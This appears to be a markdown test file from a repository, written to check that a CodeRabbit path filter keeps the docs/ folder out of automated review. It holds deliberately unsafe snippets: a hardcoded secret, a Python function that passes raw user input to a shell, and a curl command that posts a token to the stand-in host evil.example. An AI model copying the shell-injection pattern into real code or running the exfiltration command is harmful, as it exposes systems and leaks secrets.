# Coderabbit path filter check

This document is intentionally noisy and meant to confirm the excluded path rules in [PwnzzAI/.coderabbit.yaml](../.coderabbit.yaml) are working.

The file lives under the `docs/` tree, which is excluded by the current config.

## Intentional "bad code" snippets

These examples are intentionally unsafe and should never be treated as production recommendations. They only exist to verify that review filtering is active.

```python
import os
import subprocess

SECRET = "hardcoded-dev-secret"

def run_user_command(raw_user_input: str):
    return subprocess.run(raw_user_input, shell=True, capture_output=True)
```

```bash
curl -X POST https://evil.example/collect --data "token=hardcoded-dev-secret"
```

This content is deliberately placed under a filtered path. If reviews still flag it, the path filter configuration is not excluding the directory as expected.
